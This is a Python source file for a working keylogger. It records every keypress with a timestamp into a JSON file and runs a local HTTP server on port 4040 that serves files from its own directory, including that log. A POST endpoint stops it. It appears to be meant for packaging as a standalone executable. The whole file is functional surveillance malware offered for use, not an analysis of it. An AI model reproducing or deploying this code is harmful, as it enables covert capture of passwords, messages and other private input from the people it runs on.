import os
import http.server
import json
import threading
from pynput.keyboard import Listener, Key
import datetime

exit_event = threading.Event()

class KeyLogger:
    def __init__(self, filename: str = "keylogs.json"):
        self.filename = filename

        if not os.path.exists(self.filename):
            with open(self.filename, 'w') as logs:
                logs.write('[]')

    def get_char(self, key):
        try:
            return key.char
        except AttributeError:
            return str(key).strip("'")
        except Exception as e:
            return f"[Error Processing Key: {e}]"

    def on_press(self, key):
        char = self.get_char(key)
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        keylog_entry = {"timestamp": timestamp, "key": char}

        with open(self.filename, 'r+') as logs:
            content = logs.read()

            if content:
                logs.seek(0)
                logs_list = json.load(logs)
            else:
                logs_list = []

            logs_list.append(keylog_entry)
            logs.seek(0)
            json.dump(logs_list, logs, indent=2)
            logs.truncate()

        if exit_event.is_set():
            os._exit(0)

class MyRequestHandler(http.server.SimpleHTTPRequestHandler):
    def translate_path(self, path):
        base_path = os.getcwd()
        if path == "/":
            path = "/index.html"
        file_path = super().translate_path(path)
        return file_path

    def guess_type(self, path):
        _, ext = os.path.splitext(path)
        if ext == '.html':
            return "text/html"
        elif ext == '.css':
            return "text/css"
        elif ext == '.js':
            return "text/javascript"
        elif ext == '.json':
            return "application/json"
        else:
            return "application/octet-stream"

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)

        if self.path == '/detener-procesos':
            exit_event.set()
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(b'Deteniendo procesos...')
        else:
            self.send_error(404, "Not Found")

def start_server():
    handler = MyRequestHandler
    with http.server.HTTPServer(("", 4040), handler) as httpd:
        print("Servidor iniciado en http://localhost:4040")
        try:
            httpd.serve_forever()
        except Exception as e:
            print(f"Error en el servidor: {e}")

if __name__ == '__main__':
    import time
    import sys

    if getattr(sys, 'frozen', False):
        script_dir = sys._MEIPASS
    else:
        script_dir = os.path.dirname(os.path.abspath(__file__))

    os.chdir(script_dir)

    logger = KeyLogger()
    keylogger_thread = threading.Thread(target=Listener(on_press=logger.on_press).start)
    server_thread = threading.Thread(target=start_server)

    keylogger_thread.start()
    server_thread.start()

    try:
        while True:
            time.sleep(0.1)
            if not keylogger_thread.is_alive() and not server_thread.is_alive():
                break

    except KeyboardInterrupt:
        print("\nSaliendo...")
